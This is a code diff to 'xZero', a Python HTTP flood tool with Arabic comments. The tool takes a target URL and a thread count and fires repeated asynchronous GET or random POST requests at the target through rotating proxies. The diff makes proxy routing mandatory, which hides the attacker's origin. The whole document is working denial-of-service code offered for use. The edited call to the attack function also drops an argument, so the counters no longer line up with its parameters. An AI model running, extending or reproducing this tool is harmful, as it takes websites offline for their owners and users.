@@ -9,15 +9,13 @@ import os
 os.system('clear')
 print(f'''
 {Fore.CYAN}
-
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣛⡛⠋⠉⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{Fore.RED} xZero V 1.0
 
 {Style.RESET_ALL}
@@ -41,25 +39,25 @@ async def http_attack(target, proxy=None, method="GET", headers=None, success_co
                     # توليد بيانات POST عشوائية
                     data = random_post_data()
                     async with session.post(target, headers=headers, proxy=proxy, data=data) as res:
-                        print(f"{Fore.GREEN}Request sent (POST) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}({success_counter}) Request sent (POST) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
                         success_counter[0] += 1  # زيادة العداد
                 else:
                     async with session.get(target, headers=headers, proxy=proxy) as res:
-                        print(f"{Fore.GREEN}Request sent (GET) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}({success_counter}) Request sent (GET) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
                         success_counter[0] += 1  # زيادة العداد
 
             except Exception as e:
-                print(f"{Fore.RED}[ ! ] An error occurred with proxy {proxy}: {str(e)}{Style.RESET_ALL}")
+                print(f"{Fore.RED}[ ! ] An error occurred: {str(e)}{Style.RESET_ALL}")
                 failure_counter[0] += 1  # زيادة العداد للفشل
             await asyncio.sleep(0.1)  # تأخير بين الطلبات لتقليل الضغط
 
-async def main(url, threads, proxies, method, use_proxies):
+async def main(url, threads, proxies, method):
     success_counter = [0]  # عداد الطلبات الناجحة
     failure_counter = [0]  # عداد الطلبات الفاشلة
     tasks = []
     for _ in range(threads):
-        proxy = random.choice(proxies) if use_proxies else None  # اختيار بروكسي عشوائي إذا كان مفعلًا
-        tasks.append(asyncio.create_task(http_attack(url, proxy, method, None, success_counter, failure_counter)))
+        proxy = random.choice(proxies)  # اختيار بروكسي عشوائي
+        tasks.append(asyncio.create_task(http_attack(url, proxy, method, success_counter, failure_counter)))
     await asyncio.gather(*tasks)
 
     # تقرير نهائي
@@ -75,7 +73,7 @@ def load_proxies(file_path):
 if __name__ == "__main__":
     url = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Target]
 {Fore.CYAN}└──╼ ~ ❯ ''')
-
+    
     try:
         threads = int(input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Threads]
 {Fore.CYAN}└──╼ ~ ❯ '''))
@@ -86,10 +84,7 @@ if __name__ == "__main__":
         exit("Threads count must be greater than 0!")
 
     proxies = load_proxies("proxy_list.txt")
-    use_proxies = input(f'''{Fore.CYAN}┌─(xZero)─{Fore.RED}[~ Use Proxies? (y/n)]
-{Fore.CYAN}└──╼ ~ ❯ ''').strip().lower() == 'y'
-    
-    if use_proxies and not proxies:
+    if not proxies:
         exit("No proxies found in the file!")
 
     # تحديد نوع الطلب
@@ -98,4 +93,6 @@ if __name__ == "__main__":
     if method not in ["GET", "POST"]:
         exit("Invalid method! Please choose GET or POST.")
 
-    asyncio.run(main(url, threads, proxies, method, use_proxies))
+    asyncio.run(main(url, threads, proxies, method))
+    
+    
